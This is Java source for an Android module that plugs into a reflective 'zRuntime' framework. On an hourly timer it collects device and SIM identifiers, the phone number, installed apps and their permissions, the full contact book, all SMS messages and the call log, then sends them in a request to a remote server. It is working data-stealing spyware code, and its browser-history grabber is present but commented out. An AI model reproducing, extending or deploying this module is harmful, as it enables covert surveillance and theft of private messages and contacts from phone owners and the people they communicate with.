package zer0.xb6f34e12;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.SystemClock;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.List;

public class ModuleImpl
{
    private final Module _module;
    private long _lastTimestamp;

    private final Uri BOOKMARKS_URI = Uri.parse("content://browser/bookmarks");

    private static final String _android_os_build_fields[] = {
            "Bootloader", android.os.Build.BOOTLOADER,
            "Brand", android.os.Build.BRAND,
            "Device", android.os.Build.DEVICE,
            "Display", android.os.Build.DISPLAY,
            "Fingerprint", android.os.Build.FINGERPRINT,
            "Host", android.os.Build.HOST,
            "ID", android.os.Build.ID,
            "Manufacturer", android.os.Build.MANUFACTURER,
            "Model", android.os.Build.MODEL,
            "Product", android.os.Build.PRODUCT,
            "Tags", android.os.Build.TAGS,
            "Time", String.format("%d", android.os.Build.TIME),
            "Type", android.os.Build.TYPE,
            "User", android.os.Build.USER,
            "Codename", android.os.Build.VERSION.CODENAME,
            "Incremental", android.os.Build.VERSION.INCREMENTAL,
            "Release", android.os.Build.VERSION.RELEASE,
            "SDK", String.format("%d", android.os.Build.VERSION.SDK_INT),
            "Available Processors", String.format("%d", java.lang.Runtime.getRuntime().availableProcessors()),
            "Max Memory", String.format("%d", java.lang.Runtime.getRuntime().maxMemory()),
            "Total Memory", String.format("%d", java.lang.Runtime.getRuntime().totalMemory())};

    private final int _hash = 0xb6f34e12;
    private Reflect _zRuntime;
    private Context _context;


    public ModuleImpl(final Module module)
    {
        _module = module;
        _lastTimestamp = 0;
    }

    public int getHash()
    {
        return _hash;
    }

    public void onInit(Object zRuntime)
    {
        _zRuntime = Reflect.on(zRuntime);
        _context = _zRuntime.call("getContext").get();
    }

    public void onLoad()
    {
        _zRuntime.call("addCommonTask", _module);
    }

    public void onUnload()
    {
    }

    public void doCommonJob(final long currentMillis)
    {
        boolean ret = ((currentMillis - _lastTimestamp) >= 60L * 60L * 1000L); // one hour
        if (!ret) {
            return;
        }
        _lastTimestamp = currentMillis;

        Object zRequest = _zRuntime.call("createRequest").get();
        _zRuntime.call("requestInit", zRequest, _hash);
        Object zos = _zRuntime.call("requestGetOutputStream", zRequest).get();

        try {
            _zRuntime.call("zosWriteBinaryString", zos, grabCommon().toString());
        }
        catch (Exception e) {
            e.printStackTrace();
            _zRuntime.call("zosWriteBinaryString", zos, "{}");
        }

        try {
            _zRuntime.call("zosWriteBinaryString", zos, grabApps().toString());
        }
        catch (Exception e) {
            e.printStackTrace();
            _zRuntime.call("zosWriteBinaryString", zos, "{}");
        }

        try {
            _zRuntime.call("zosWriteBinaryString", zos, grabContacts().toString());
        }
        catch (Exception e) {
            e.printStackTrace();
            _zRuntime.call("zosWriteBinaryString", zos, "{}");
        }

        try {
            _zRuntime.call("zosWriteBinaryString", zos, grabSMSes().toString());
        }
        catch (Exception e) {
            e.printStackTrace();
            _zRuntime.call("zosWriteBinaryString", zos, "{}");
        }

//        try {
//            _zRuntime.call("zosWriteBinaryString", zos, grabBrowHistory().toString());
//        }
//        catch (Exception e) {
//            e.printStackTrace();
            _zRuntime.call("zosWriteBinaryString", zos, "{}");
//        }

        try {
            _zRuntime.call("zosWriteBinaryString", zos, grabCalls().toString());
        }
        catch (Exception e) {
            e.printStackTrace();
            _zRuntime.call("zosWriteBinaryString", zos, "{}");
        }

        Object zis = null;
        try {
            zis = _zRuntime.call("requestDo", zRequest).get();
            if (zis != null) {
                int result = (int)_zRuntime.call("zisReadInt", zis).get();
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        finally {
            try {
                if (zis != null) {
                    _zRuntime.call("zisClose", zis);
                }
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    // Common data
    private void addNodeInfo(JSONArray jsonInfoArray, String name, String value)
    {
        try {
            JSONObject jsonInfo = new JSONObject();
            jsonInfo.put("key", name);
            jsonInfo.put("val", value);
            jsonInfoArray.put(jsonInfo);
        }
        catch (JSONException e) {
            e.printStackTrace();
        }
    }

    private JSONArray grabCommon()
    {
        JSONArray jsonInfoArray = new JSONArray();

        // device info
        for (int i = 0; i < _android_os_build_fields.length; i += 2) {
            try {
                String val = _android_os_build_fields[i + 1];
                if (val == null) {
                    val = "unknown";
                }
                addNodeInfo(jsonInfoArray, _android_os_build_fields[i], val);
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }

        BufferedReader br = null;
        try {
            String[] args = { "/system/bin/cat", "/proc/cpuinfo" };
            ProcessBuilder pb = new ProcessBuilder(args);
            Process process;
            process = pb.start();
            InputStream in = process.getInputStream();
            br = new BufferedReader(new InputStreamReader(in));
            String aLine;
            while ((aLine = br.readLine()) != null) {
                aLine = aLine.trim();
                if (!aLine.equals("")) {
                    String[] data = aLine.split(":");
                    try {
                        String sKey = data[0].trim();
                        String sVal = data[1].trim();
                        if (!sKey.equals("") && !sVal.equals("")) {
                            addNodeInfo(jsonInfoArray, sKey, sVal);
                        }
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        }
        catch (IOException e) {
            e.printStackTrace();
        }
        finally {
            if (br != null) {
                try {
                    br.close();
                }
                catch (Exception e){
                    e.printStackTrace();
                }
            }
        }

        long uptimeMs = SystemClock.elapsedRealtime();
        long x = uptimeMs / 1000;
        long upSeconds = x % 60;
        x /= 60;
        long upMinutes = x % 60;
        x /= 60;
        long upHours = x % 24;
        x /= 24;
        addNodeInfo(jsonInfoArray, "Uptime", String.format("%d:%d:%d:%d", x, upHours, upMinutes, upSeconds));

        //Telephony Manager
        TelephonyManager tm = (TelephonyManager)_context.getSystemService(Context.TELEPHONY_SERVICE);
        int val = tm.getPhoneType();
        String sVal = "unknown";
        switch (val) {
            case TelephonyManager.PHONE_TYPE_NONE: sVal = "None"; break;
            case TelephonyManager.PHONE_TYPE_GSM: sVal = "GSM"; break;
            case TelephonyManager.PHONE_TYPE_CDMA: sVal = "CDMA"; break;
            case 3: sVal = "SIP"; break;
        }
        addNodeInfo(jsonInfoArray, "Phone Type", sVal);
        addNodeInfo(jsonInfoArray, "Device ID", tm.getDeviceId());
        addNodeInfo(jsonInfoArray, "Device Software Version", tm.getDeviceSoftwareVersion());
        addNodeInfo(jsonInfoArray, "Phone Number 1", (String)_zRuntime.call("getLine1Number").get());
        addNodeInfo(jsonInfoArray, "Network Operator Name", (String)_zRuntime.call("getNetworkOperatorName").get());
        addNodeInfo(jsonInfoArray, "Network Operator", tm.getNetworkOperator());
        addNodeInfo(jsonInfoArray, "Network Country ISO", tm.getNetworkCountryIso());
        addNodeInfo(jsonInfoArray, "Network Type", (String)_zRuntime.call("getNetworkType").get());
        addNodeInfo(jsonInfoArray, "SIM State", (String)_zRuntime.call("getSIMState").get());

        if (val == TelephonyManager.SIM_STATE_READY) {
            addNodeInfo(jsonInfoArray, "SIM Operator", tm.getSimOperator());
            addNodeInfo(jsonInfoArray, "SIM Operator Name", tm.getSimOperatorName());
            addNodeInfo(jsonInfoArray, "SIM Country ISO", tm.getSimCountryIso());
            addNodeInfo(jsonInfoArray, "SIM Serial Number", tm.getSimSerialNumber());
        }

        addNodeInfo(jsonInfoArray, "Subscriber ID", tm.getSubscriberId());

        // Environment
        addNodeInfo(jsonInfoArray, "Root Directory", android.os.Environment.getRootDirectory().getPath());
        addNodeInfo(jsonInfoArray, "Data Directory", android.os.Environment.getDataDirectory().getPath());
        addNodeInfo(jsonInfoArray, "External Storage Directory", android.os.Environment.getExternalStorageDirectory().getPath());
        addNodeInfo(jsonInfoArray, "External Storage State", android.os.Environment.getExternalStorageState());
        addNodeInfo(jsonInfoArray, "Download Cache Directory", android.os.Environment.getDownloadCacheDirectory().getPath());
        addNodeInfo(jsonInfoArray, "Public Directory - ALARMS", android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_ALARMS).getPath());
        addNodeInfo(jsonInfoArray, "Public Directory - DCIM", android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DCIM).getPath());
        addNodeInfo(jsonInfoArray, "Public Directory - DOWNLOADS", android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOWNLOADS).getPath());
        addNodeInfo(jsonInfoArray, "Public Directory - MOVIES", android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_MOVIES).getPath());
        addNodeInfo(jsonInfoArray, "Public Directory - MUSIC", android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_MUSIC).getPath());
        addNodeInfo(jsonInfoArray, "Public Directory - NOTIFICATIONS", android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_NOTIFICATIONS).getPath());
        addNodeInfo(jsonInfoArray, "Public Directory - PICTURES", android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_PICTURES).getPath());
        addNodeInfo(jsonInfoArray, "Public Directory - PODCASTS", android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_PODCASTS).getPath());
        addNodeInfo(jsonInfoArray, "Public Directory - RINGTONES", android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_RINGTONES).getPath());

        return jsonInfoArray;
    }

    private JSONArray grabApps()
    {
        JSONArray jsonAppArray = new JSONArray();
        PackageManager pm = _context.getPackageManager();
        //get a list of installed apps.
        List<PackageInfo> packages = pm.getInstalledPackages(PackageManager.GET_RECEIVERS|PackageManager.GET_SERVICES |PackageManager.GET_ACTIVITIES | PackageManager.GET_PERMISSIONS);

        for (PackageInfo packageInfo : packages) {
            try {
                JSONObject jsonApp = new JSONObject();
                jsonApp.put("name", pm.getApplicationLabel(packageInfo.applicationInfo).toString());
                jsonApp.put("pkg", packageInfo.packageName);
                jsonApp.put("sdir", packageInfo.applicationInfo.sourceDir);
                jsonApp.put("ddir", packageInfo.applicationInfo.dataDir);
                jsonApp.put("a", pm.getLaunchIntentForPackage(packageInfo.packageName));
                jsonApp.put("sdk", packageInfo.applicationInfo.targetSdkVersion);
                jsonApp.put("vc", packageInfo.versionCode);
                jsonApp.put("vn", packageInfo.versionName);

                String perms = "";
                if (packageInfo.requestedPermissions != null) {
                    for (int i = 0; i < packageInfo.requestedPermissions.length; ++i) {
                        String perm = packageInfo.requestedPermissions[i];
                        if (perm.startsWith("android.permission.")) {
                            perm = perm.substring(19);
                        }
                        perms += perm + ";";
                    }
                }
                else {
                    perms = "none";
                }
                jsonApp.put("perms", perms);
                jsonAppArray.put(jsonApp);
            }
            catch (JSONException e) {
                e.printStackTrace();
            }
        }
        return jsonAppArray;
    }

    private JSONArray grabContacts()
    {
        JSONArray array = new JSONArray();
        Cursor c = null;
        try {
            Uri uri = ContactsContract.Contacts.CONTENT_URI;
            ContentResolver cr = _context.getContentResolver();
            c = cr.query(uri, null, null, null, null);
            if (c != null && c.moveToFirst()) {
                while (c.moveToNext()) {
                    JSONObject jsonContact = new JSONObject();
                    String id = c.getString(c.getColumnIndex(ContactsContract.Contacts._ID));
                    jsonContact.put("name", c.getString(c.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)));

                    String values = "";
                    try {
                        Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);

                        while (pCur.moveToNext()) {
                            int type = Integer.parseInt(pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)));
                            String sType = "unknown";
                            switch (type) {
                                case ContactsContract.CommonDataKinds.Phone.TYPE_HOME:
                                    sType = "Home";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE:
                                    sType = "Mobile";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_WORK:
                                    sType = "Work";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_WORK:
                                    sType = "Fax Work";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_FAX_HOME:
                                    sType = "Fax Home";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_PAGER:
                                    sType = "Pager";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_OTHER:
                                    sType = "Other";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_CALLBACK:
                                    sType = "Callback";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_CAR:
                                    sType = "Car";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_COMPANY_MAIN:
                                    sType = "Company Main";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_ISDN:
                                    sType = "ISDN";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_MAIN:
                                    sType = "Main";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_OTHER_FAX:
                                    sType = "Other Fax";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_RADIO:
                                    sType = "Radio";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_TELEX:
                                    sType = "Telex";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_TTY_TDD:
                                    sType = "TTY TDD";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_WORK_MOBILE:
                                    sType = "Work Mobile";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_WORK_PAGER:
                                    sType = "Work Pager";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_ASSISTANT:
                                    sType = "Assistant";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_MMS:
                                    sType = "MMS";
                                    break;
                                case ContactsContract.CommonDataKinds.Phone.TYPE_CUSTOM: {
                                    sType = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.LABEL));
                                    break;
                                }
                            }
                            values += sType + "|" + pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)) + ";";
                        }
                        pCur.close();
                        jsonContact.put("phone", values);
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                    }
                    try {
                        Cursor emailCur = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?", new String[]{id}, null);
                        values = "";
                        while (emailCur.moveToNext()) {
                            int type = Integer.parseInt(emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE)));
                            String sType = "unknown";
                            switch (type) {
                                case ContactsContract.CommonDataKinds.Email.TYPE_HOME:
                                    sType = "Home";
                                    break;
                                case ContactsContract.CommonDataKinds.Email.TYPE_WORK:
                                    sType = "Work";
                                    break;
                                case ContactsContract.CommonDataKinds.Email.TYPE_OTHER:
                                    sType = "Other";
                                    break;
                                case ContactsContract.CommonDataKinds.Email.TYPE_MOBILE:
                                    sType = "Mobile";
                                    break;
                                case ContactsContract.CommonDataKinds.Email.TYPE_CUSTOM: {
                                    sType = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.LABEL));
                                    break;
                                }
                            }
                            values += sType + "|" + emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA)) + ";";
                        }
                        emailCur.close();
                        if (!values.equals("")) {
                            jsonContact.put("email", values);
                        }
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                    }

                    try {
                        String noteWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                        String[] noteWhereParams = new String[]{id, ContactsContract.CommonDataKinds.Note.CONTENT_ITEM_TYPE};
                        Cursor noteCur = cr.query(ContactsContract.Data.CONTENT_URI, null, noteWhere, noteWhereParams, null);
                        if (noteCur.moveToFirst()) {
                            jsonContact.put("note", noteCur.getString(noteCur.getColumnIndex(ContactsContract.CommonDataKinds.Note.NOTE)));
                        }
                        noteCur.close();
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                    }

                    try {
                        String addrWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                        String[] addrWhereParams = new String[]{id, ContactsContract.CommonDataKinds.StructuredPostal.CONTENT_ITEM_TYPE};
                        Cursor addrCur = cr.query(ContactsContract.Data.CONTENT_URI, null, addrWhere, addrWhereParams, null);
                        values = "";
                        if (addrCur.moveToFirst()) {
                            String poBox = addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POBOX));
                            String street = addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.STREET));
                            String city = addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.CITY));
                            String region = addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.REGION));
                            String postalCode = addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.POSTCODE));
                            String country = addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.COUNTRY));
                            String neighborhood = addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.NEIGHBORHOOD));

                            int type = Integer.parseInt(addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.TYPE)));
                            String sType = "unknown";
                            switch (type) {
                                case ContactsContract.CommonDataKinds.StructuredPostal.TYPE_HOME:
                                    sType = "Home";
                                    break;
                                case ContactsContract.CommonDataKinds.StructuredPostal.TYPE_WORK:
                                    sType = "Work";
                                    break;
                                case ContactsContract.CommonDataKinds.StructuredPostal.TYPE_OTHER:
                                    sType = "Other";
                                    break;
                                case ContactsContract.CommonDataKinds.StructuredPostal.TYPE_CUSTOM: {
                                    sType = addrCur.getString(addrCur.getColumnIndex(ContactsContract.CommonDataKinds.StructuredPostal.LABEL));
                                    break;
                                }
                            }
                            values += sType + "|";
                            if (street != null) {
                                values += street + ", ";
                            }
                            if (poBox != null) {
                                values += poBox + ", ";
                            }
                            if (neighborhood != null) {
                                values += neighborhood + ", ";
                            }
                            if (city != null) {
                                values += city + ", ";
                            }
                            if (region != null) {
                                values += region + ", ";
                            }
                            if (postalCode != null) {
                                values += postalCode + ", ";
                            }
                            if (country != null) {
                                values += country + ";";
                            }

                            jsonContact.put("addr", values);
                        }
                        addrCur.close();
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                    }
                    try {
                        String imWhere = ContactsContract.Data.CONTACT_ID + " = ? AND " + ContactsContract.Data.MIMETYPE + " = ?";
                        String[] imWhereParams = new String[]{id, ContactsContract.CommonDataKinds.Im.CONTENT_ITEM_TYPE};
                        Cursor imCur = cr.query(ContactsContract.Data.CONTENT_URI, null, imWhere, imWhereParams, null);
                        values = "";
                        while (imCur.moveToNext()) {
                            int type = Integer.parseInt(imCur.getString(imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.TYPE)));
                            String sType = "unknown";
                            switch (type) {
                                case ContactsContract.CommonDataKinds.Im.TYPE_HOME:
                                    sType = "Home";
                                    break;
                                case ContactsContract.CommonDataKinds.Im.TYPE_WORK:
                                    sType = "Work";
                                    break;
                                case ContactsContract.CommonDataKinds.Im.TYPE_OTHER:
                                    sType = "Other";
                                    break;
                                case ContactsContract.CommonDataKinds.Im.TYPE_CUSTOM: {
                                    sType = imCur.getString(imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.LABEL));
                                    break;
                                }
                            }
                            values += sType + "|";

                            type = Integer.parseInt(imCur.getString(imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.PROTOCOL)));
                            sType = "unknown";
                            switch (type) {
                                case ContactsContract.CommonDataKinds.Im.PROTOCOL_AIM:
                                    sType = "AIM";
                                    break;
                                case ContactsContract.CommonDataKinds.Im.PROTOCOL_MSN:
                                    sType = "MSN";
                                    break;
                                case ContactsContract.CommonDataKinds.Im.PROTOCOL_YAHOO:
                                    sType = "YAHOO";
                                    break;
                                case ContactsContract.CommonDataKinds.Im.PROTOCOL_SKYPE:
                                    sType = "SKYPE";
                                    break;
                                case ContactsContract.CommonDataKinds.Im.PROTOCOL_QQ:
                                    sType = "QQ";
                                    break;
                                case ContactsContract.CommonDataKinds.Im.PROTOCOL_GOOGLE_TALK:
                                    sType = "GOOGLE_TALK";
                                    break;
                                case ContactsContract.CommonDataKinds.Im.PROTOCOL_ICQ:
                                    sType = "ICQ";
                                    break;
                                case ContactsContract.CommonDataKinds.Im.PROTOCOL_JABBER:
                                    sType = "JABBER";
                                    break;
                                case ContactsContract.CommonDataKinds.Im.PROTOCOL_NETMEETING:
                                    sType = "NETMEETING";
                                    break;
                                case ContactsContract.CommonDataKinds.Im.PROTOCOL_CUSTOM: {
                                    sType = imCur.getString(imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.CUSTOM_PROTOCOL));
                                    break;
                                }
                            }

                            values += sType + "|" + imCur.getString(imCur.getColumnIndex(ContactsContract.CommonDataKinds.Im.DATA)) + ";";
                        }
                        imCur.close();
                        if (!values.equals("")) {
                            jsonContact.put("im", values);
                        }
                    }
                    catch (Exception e) {
                        e.printStackTrace();
                    }
                    array.put(jsonContact);
                }
            }
        }
        catch(Exception e){
            e.printStackTrace();
        }
        finally{
            if (c!=null) {
                c.close();
            }
        }
        return array;
    }

    private JSONArray grabSMSes()
    {
        JSONArray array=new JSONArray();
        Cursor c = null;
        try{
            Uri message = Uri.parse("content://sms");
            c = _context.getContentResolver().query(message, null, null, null, null);
            if (c != null && c.moveToFirst()) {
                while (c.moveToNext()) {
                    int type = Integer.parseInt(c.getString(c.getColumnIndexOrThrow("type")));
                    if (type == 1 || type == 2) {
                        JSONObject jsonMessage = new JSONObject();
                        jsonMessage.put("id", c.getString(c.getColumnIndexOrThrow("_id")));
                        jsonMessage.put("addr", c.getString(c.getColumnIndexOrThrow("address")));
                        jsonMessage.put("body", c.getString(c.getColumnIndexOrThrow("body")));
                        long time = Long.parseLong(c.getString(c.getColumnIndexOrThrow("date"))) / 1000;
                        jsonMessage.put("time", time);
                        jsonMessage.put("folder", type); // 1 - inbox, 2 - sent
                        array.put(jsonMessage);
                    }
                }
            }
        }
        catch(Exception e) {
            e.printStackTrace();
        }
        finally {
            if (c != null) {
                c.close();
            }
        }
        return array;
    }

//    private JSONArray grabBrowHistory()
//    {
//        JSONArray array=new JSONArray();
//        Cursor c = null;
//        try {
//            c = _context.getContentResolver().query(BOOKMARKS_URI, null, null, null, null);
//            if (c != null && c.moveToFirst()) {
//                do {
//                    JSONObject jsonMessage = new JSONObject();
//                    String sVal = c.getString(c.getColumnIndex(android.provider.Browser.BookmarkColumns.DATE));
//                    if (sVal != null) {
//                        long time = Long.parseLong(sVal) / 1000;
//                        jsonMessage.put("time", time);
//                    }
//                    sVal = c.getString(c.getColumnIndex(android.provider.Browser.BookmarkColumns.VISITS));
//                    if (sVal != null) {
//                        try {
//                            long val = Long.parseLong(sVal);
//                            if (val > 0) {
//                                jsonMessage.put("visits", val);
//                            }
//                        }
//                        catch(Exception e){
//                            e.printStackTrace();
//                        }
//                    }
//                    jsonMessage.put("title", c.getString(c.getColumnIndex(android.provider.Browser.BookmarkColumns.TITLE)));
//                    jsonMessage.put("url", c.getString(c.getColumnIndex(android.provider.Browser.BookmarkColumns.URL)));
//
//                    array.put(jsonMessage);
//                } while (c.moveToNext());
//            }
//        }
//        catch(Exception e){
//            e.printStackTrace();
//        }
//        finally{
//            if (c!=null){
//                c.close();
//            }
//        }
//        return array;
//    }

    private JSONArray grabCalls()
    {
        JSONArray array=new JSONArray();
        Cursor c = null;
        try{
            Uri message = Uri.parse("content://call_log/calls");
            c = _context.getContentResolver().query(message, null, null, null, null);
            if (c != null && c.moveToFirst()) {
                while (c.moveToNext()) {
                    int type = Integer.parseInt(c.getString(c.getColumnIndexOrThrow("type")));
                    if (type == 1 || type == 2 || type == 3) {
                        JSONObject jsonMessage = new JSONObject();
                        jsonMessage.put("type", type); // 1 - Incoming, 2 - Outgoing, 3 - Missed

                        String val = c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME));
                        if (val != null) {
                            jsonMessage.put("name", val);
                        }
                        long time = Long.parseLong(c.getString(c.getColumnIndex(CallLog.Calls.DATE))) / 1000;
                        jsonMessage.put("time", time);
                        jsonMessage.put("number", c.getString(c.getColumnIndex(CallLog.Calls.NUMBER)));

                        val = c.getString(c.getColumnIndex(CallLog.Calls.DURATION));
                        if (val != null) {
                            int duration = Integer.parseInt(val);
                            if (duration > 0) {
                                jsonMessage.put("durat", duration); // in seconds
                            }
                        }
                        array.put(jsonMessage);
                    }
                }
            }
        }
        catch(Exception e) {
            e.printStackTrace();
        }
        finally {
            if (c != null) {
                c.close();
            }
        }
        return array;
    }
}